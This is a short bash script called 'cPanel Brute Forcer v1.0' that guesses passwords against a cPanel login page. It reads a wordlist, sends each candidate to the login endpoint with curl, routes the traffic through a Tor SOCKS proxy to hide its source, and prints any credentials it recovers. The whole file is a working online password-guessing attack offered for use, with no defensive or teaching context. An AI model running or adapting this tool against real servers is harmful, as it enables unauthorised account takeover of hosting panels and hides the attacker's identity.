#!/bin/bash
echo -e '\e[31m
 ___ ___  ____ _  _ ____ _       ___  ____ _  _ ___ ____    ____ ____ ____ ____ ____ ____
|    |__] |__| |\ | |___ |       |__] |__/ |  |  |  |___    |___ |  | |__/ |    |___ |__/
|___ |    |  | | \| |___ |___    |__] |  \ |__|  |  |___    |    |__| |  \ |___ |___ |  \ v1.0
\e[0m
'
echo -e "\t\t C0d3d by Mourad NOUAILI a.k.a. blackbird."
echo
echo
if [[ $# -ne 4 ]]; then
  echo "Wrong number of arguments."
  echo "Usage: $0 url port user file-of-passwords"
  echo "Example #1: $0 http://site.com 2082 adminsite passwords.txt"
  echo "Example #2: $0 http://cpanel.site.com 80 webMaster dico"
  exit
fi

url=$1
port=$2
user=$3
file=$4
cnt=0
while read pass; do
  lenPass=${#pass}
  len=$((30-$lenPass))
  echo -ne "Testing password \e[34m$pass\e[0m"
  response=$(curl -s -X POST ${url}':'${port}'/login/?login_only=1' \
              --data-urlencode "user=${user}" --data-urlencode "pass=${pass}" \
              --socks5 localhost:9050)
  if [[ $response =~ ^.*invalid_login.*$ ]]; then
    printf '\e[31m%*s\e[m\n' "$len" "[Failed]"
  fi
  if [[ $response =~ ^.*index.html.*$ ]]; then
    printf '\e[92m%*s\e[m\n' "$len" "[Success]"
    echo
    echo "Found after $cnt attempts."
    echo -e "\t$url:$port"
    echo -e "\tusername: $user"
    echo -e "\tpassword: $pass"
    exit
  fi
  cnt=$((cnt+1))
  attempts=`expr $cnt%50`
  if [[ $attempts -eq 0 ]]; then
    echo -e "\e[35mUntil now $cnt passwords were tested.\e[0m"
  fi
done < $file
